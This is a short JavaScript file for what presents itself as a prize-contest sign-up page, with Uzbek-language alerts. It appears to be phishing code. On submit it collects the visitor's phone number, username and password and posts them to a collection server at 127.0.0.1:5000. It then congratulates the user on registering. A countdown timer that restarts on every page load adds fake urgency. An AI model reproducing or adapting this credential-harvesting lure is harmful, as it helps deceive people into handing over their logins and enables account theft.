document.getElementById('contestForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = {
        phone: document.querySelector('input[type="tel"]').value,
        username: document.querySelector('input[type="text"]').value,
        password: document.querySelector('input[type="password"]').value
    };

    fetch('http://127.0.0.1:5000/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => alert(data.message))
    .catch(error => console.error('Xatolik:', error));
});
function updateTimer() {
    const endDate = new Date();
    endDate.setDate(endDate.getDate() + 5);
    endDate.setHours(endDate.getHours() + 12);
    endDate.setMinutes(endDate.getMinutes() + 30);

    const timer = setInterval(() => {
        const now = new Date().getTime();
        const distance = endDate - now;

        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);

        document.getElementById('days').textContent = String(days).padStart(2, '0');
        document.getElementById('hours').textContent = String(hours).padStart(2, '0');
        document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
        document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');

        if (distance < 0) {
            clearInterval(timer);
        }
    }, 1000);
}

document.getElementById('contestForm').addEventListener('submit', function(e) {
    e.preventDefault();
    alert('Tabriklaymiz! Siz muvaffaqiyatli ro\'yxatdan o\'tdingiz!');
});

updateTimer();